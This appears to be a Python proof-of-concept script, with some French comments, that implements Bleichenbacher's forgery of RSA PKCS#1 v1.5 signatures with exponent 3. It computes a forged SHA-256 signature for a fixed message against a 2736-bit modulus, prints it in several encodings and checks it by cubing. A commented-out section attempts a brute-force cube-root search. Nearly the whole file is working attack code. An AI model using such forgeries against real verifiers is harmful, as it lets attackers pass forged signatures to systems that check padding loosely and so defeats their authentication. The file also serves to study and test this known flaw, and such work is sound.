import hashlib
import numpy as np
from sympy import cbrt
import random
import string
import math 
import base64 


keySize = 2736
#N = "00b149477e0d169106ece603b3d1fb0d3b2e85381b974e5b69d06642382a7c96c254ff315cf8971b25e83d2b8df433bf857c16c82ed4607f2fc24365c3e6c5a05dd57381c68bb8915e33694f5bae1a9302815e5592e64970e037596fa3588cf7f9a0562c15ad5289708379dc94306ca30b4cb1f27583e5c398fd3e2ea2edc052e98aad2f20c4b8441c512eb448008cc3418d559e36b3bd0dd4dd85810d506367538e2d005965564a0181a5bc5d7f325781ffe007832f21bb913f2c94f4204f6c258e87ee3ee9e0b17ff3c1eae53195bccc2b369642b103001d81b424fded7cc87a08e4c61a49c97aacf3d086b07293e8fc1433e6299e0a6336cc6daad5d28675cdd98cebdccc0e6b7b39873aca56cac5f7bdb5a1efc8c2b080073f63607ae0bbd31dd4a392db08b3672d7b7c3337933286b1d7b9e9801060504aa6efd408a6362b0daf97c36f676677db6e8c33c58996514f38f5565a79"
N = 28741088908187454343149051479696383970299947848968789140479675579700169771176960299140007747918194523484501276814388256250422589850693446510036404406751277530762104185640902380724872651952881488193180373891179587640085652841257153128596562228435787446102020749830448899280317497280906848802360005133890798163541877729626220589131871987478269072940811417004677186429418674325179091372831943150923637614865219350268915523293539621289719535556600156332037655094668569879204477932197086990033032519673829049512092956988562835324330588616042901694024209394500780139484396440152285712917794972347517020908831225854706995030571168092973713251687938788059748188791386212018278274853644205001896500455627582145267787646069244598011114193951541818700369115154050775237858383392560012238838733857342600737178168923948917778342447831673


# def is_integer_cubic_root(n):
#     if n < 0:
#         return False  # Pas de racine entière pour les nombres négatifs

#     cube_root = int(round(np.cbrt(n)))
#     return cube_root ** 3 == n


def is_integer_cubic_root(n):
    if n < 0:
        return False  # Pas de racine entière pour les nombres négatifs

    cube_root = int(cbrt(n))
    return cube_root ** 3 == n



def find_invpow(x,n):
    """Finds the integer component of the n'th root of x,
    an integer such that y ** n <= x < (y + 1) ** n.
    """
    high = 1
    while high ** n < x:
        high *= 2
    low = high//2
    while low < high:
        mid = (low + high) // 2
        if low < mid and mid**n < x:
            low = mid
        elif high > mid and mid**n > x:
            high = mid
        else:
            return mid
    return mid + 1


def alpha_and_beta_computation(s_n):
    
    validation_test = s_n%3
    if validation_test:
        print("[!] The forgery attack only works with RSA modulus whose size is divisible by 3")
        exit()

    alpha = (s_n-15)//3
    print(alpha)
    beta = int((s_n//3 - 581 + math.log2(3))//1) 
    print(beta)
    return alpha, beta

def signature_generation(a, alpha, beta):
    print(a%3)
    return (2**alpha)-(a//3)*(2**beta)

def garbage_computation(a, alpha, beta):
    print(a**2%3)
    print(a**3%27)
    return ((a**2)//3)*(2**(alpha+2*beta))-((a**3)//27)*(2**3)*beta


def a_generation():
    # this value correspond to the ASN value for the SHA256 algorithm
    asn_val = 1074720622405046283428835398852229154138489888
    letters = string.ascii_letters + string.digits

    # there is two conditions on the a generation : 
    #       a = 2^416-(asn_val*2^256 + H(m))
    #       a must be divisible by 3 
    
    a = 1
    while a%3!=0:
        # message = ''.join(random.choice(letters) for _ in range(6))
        message = 'coucou'
        hash_object = hashlib.sha256()
        hash_object.update(message.encode('utf-8'))
        hex_dig = hash_object.hexdigest()
        # hash_integer = int(hex_dig, 16)
        hash_integer = 7703584079456133694521101026671547685427892174886736941780607893036289161691
        a = 2**416 - (asn_val*(2**256)+hash_integer)

    print("a%3", a%3)

    return a


def main(): 
    
    
    
    # This script replicates the bleichenbacher attack forgery signature using SH256 and an arbitrary RSA modulus size

    # n corresponds to the RSA modulus 
    # s_n size of the RSA modulus in bits 
    s_n = 2736 


    if s_n < 1739 : 
        print("[!] The forgery attack based in this algorithm only works with RSA modulus larger than 1739 bits...")
        exit()
    
    print("[+] a computation")
    a = a_generation()
    print("[+] Alpha and beta computation")
    alpha, beta = alpha_and_beta_computation(s_n)
    signature = signature_generation(a, alpha, beta)
    
    print("[+] The signature in decimal format is ", signature)

    bytes_signature = int.to_bytes(signature, (signature.bit_length()+7)//8)
    print("[+] The signature in hexadecimal format is ",bytes_signature)
    
    print("[+] The signature in base64 encoding is ",base64.b64encode(bytes_signature))

    
    print("======================================================================")
    print("[+] Now it's possible to check if the created signature is valid")

    validation_test = signature**3

    print(int.to_bytes(validation_test, (validation_test.bit_length()+7)//8))


    # garbage = garbage_computation(a, alpha, beta)



    # print(garbage)
    # print(signature)


    # message = "coucou"
    # hash_object = hashlib.sha256()
    # hash_object.update(message.encode('utf-8'))
    # # print(hash_object.digest())
    # block = b'\x00\x01\xff\x00\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    # block +=hash_object.digest() 
    # # print(len(block))


    # garbage = (342-len(block)) * b'\xff' 
    # # print(len(garbage))

    # bytes_test = block + garbage


    # int_test = int.from_bytes(bytes_test)

    # # cubic_root = find_invpow(int_test,3)
    
    # print(int_test)
    # validation_test = is_integer_cubic_root(int_test)



    # # validation_test = (pow(cubic_root,3) == pow(cubic_root,3,N))
    # # second_validation_test = pow(cubic_root,3) < N

    # while not validation_test:
    #     tmp = int.from_bytes(garbage)
    #     tmp-=1
    #     print(tmp)
    #     garbage = int.to_bytes(tmp,(tmp.bit_length()+7)//8)
    #     bytes_test = block + garbage
    #     # print(len(bytes_test))
    #     int_test = int.from_bytes(bytes_test)
    #     # cubic_root = find_invpow(int_test,3)
    #     validation_test = is_integer_cubic_root(int_test)
    #     # second_validation_test = pow(cubic_root,3) < N
    #     print(validation_test)
    #     # print(second_validation_test)


    # print(validation_test)





    # # print(int_test)

    # # value = int.from_bytes(byte_object, byteorder='big')

    # # # Diminuer la valeur de 1
    # # value -= 1

    # # # Convertir de nouveau en bytes
    # # # Assurez-vous que la longueur soit correcte (1 octet dans cet exemple)
    # # new_byte_object = value.to_bytes((value.bit_length() + 7) // 8 or 1, byteorder='big')




    
    
    # # print(block)
    # #,"


main()